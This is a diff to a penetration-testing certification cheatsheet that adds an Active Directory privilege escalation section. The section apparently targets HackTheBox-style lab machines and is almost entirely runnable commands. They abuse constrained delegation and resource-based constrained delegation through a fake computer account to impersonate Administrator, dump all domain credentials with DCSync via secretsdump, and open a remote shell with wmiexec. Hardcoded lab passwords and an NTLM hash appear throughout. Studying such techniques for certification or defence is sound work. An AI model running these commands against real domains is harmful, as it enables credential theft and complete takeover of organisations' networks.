@@ -116,7 +116,7 @@ HackTheBox Certified Penetration Tester Specialist Cheatsheet
 - [Burp Suite](#Burp-Suite)
 - [whatweb](#whatweb)
 - [useful command](#useful-command)
-- [Step to privilege escalation in AD](#Step-to-escal)
+- [Step to privilege escalation in AD](#Step-to-privilege-escalation-in-AD)
 - [Useful Script To Local Windows Privilege Escalation](#Useful-Script-To-Local-Windows-Privilege-Escalation)
 - [Useful Resources To Local Windows Privilege Escalation](#Useful-Resources-To-Local-Windows-Privilege-Escalation)
 - [Useful Script To Linux Privilege Escalation](#Useful-Script-To-Linux-Privilege-Escalation)
@@ -3813,10 +3813,11 @@ dirsearch -u http://10.48.166.13
 rdesktop -g 100% 10.48.166.13
 
 ```
-## Step to escal
+## Step to privilege escalation in AD
 ```
+==================================================================================================================
 ## 1. Constrained Delegation ( HELEN.FROST  need have GenericAll permission to machine FS01 and have SeEnableDelegationPrivilege in whoami /priv )
-
+==================================================================================================================
 # Enable the Protocol Transition feature and modify UAC (userAccountControl) of machine  FS01$ to enable flag  TRUSTED_TO_AUTH_FOR_DELEGATION
 bloodyAD -d redelegate.vl -u HELEN.FROST -p '0xdf0xdf!' --host 10.129.234.50 add  uac 'FS01$' -f TRUSTED_TO_AUTH_FOR_DELEGATION
 
@@ -3826,8 +3827,31 @@ bloodyAD -d redelegate.vl -u HELEN.FROST -p '0xdf0xdf!'  --host "dc.redelegate.v
 # use FS01$ to req KDC give a service ticket (TGS) to access cifs/dc.redelegate.vl  but impersonate user ( or machine)  such as Administrator or DC$  ( have file Administrator.ccache)
 impacket-getST 'redelegate.vl/FS01$:NewPassword123!' -spn cifs/dc.redelegate.vl -impersonate Administrator
 
-#  DCSync to dump DC 
+# DCSync to dump DC 
 KRB5CCNAME=Administrator.ccache  impacket-secretsdump -k dc.redelegate.vl
+
+==================================================================================================================
+## 2. Resource-Based Constrained Delegation (RBCD) ( L.LIVINGSTONE need have GenericAll permission to computer Domain Controller RESOURCEDC)
+==================================================================================================================
+# Create a fake computer account
+impacket-addcomputer -dc-ip 192.168.109.175 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 'resourced.local/L.Livingstone' -computer-name 'ATTACKVM$' -computer-pass 'MaliciousPass123!'
+
+# Configure RBCD authorization to the Domain Controller (forcing Domain Controller to allow the fake computer ATTACKVM$ to act as trustee)
+impacket-rbcd -dc-ip 192.168.109.175 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 'resourced.local/L.Livingstone' -delegate-from 'ATTACKVM$' -delegate-to 'RESOURCEDC$' -action 'write'
+
+# Self-sign the Domain Admin impersonation service ticket with the CIFS service (SMB) (ATTACKVM$ machine to request the DC to issue a Service Ticket - ST on behalf of the Administrator)
+impacket-getST -dc-ip 192.168.109.175 -spn 'cifs/RESOURCEDC.resourced.local' -impersonate 'Administrator' 'resourced.local/ATTACKVM$:MaliciousPass123!'
+
+# Set up environment variables so that Linux can use the ticket just requested
+export KRB5CCNAME=Administrator@cifs_RESOURCEDC.resourced.local@RESOURCED.LOCAL.ccache
+sudo echo "192.168.109.175 RESOURCEDC.resourced.local RESOURCEDC" | sudo tee -a /etc/hosts
+
+# DCSync to dump DC
+impacket-secretsdump -k -no-pass 'resourced.local/Administrator@RESOURCEDC.resourced.local'
+impacket-secretsdump -k -no-pass 'resourced.local/Administrator@RESOURCEDC.resourced.local' -just-dc-user Administrator
+
+# Use the Kerberos ticket straight to get the remote shell
+impacket-wmiexec -k -no-pass 'resourced.local/Administrator@RESOURCEDC.resourced.local'
 
 
 ```
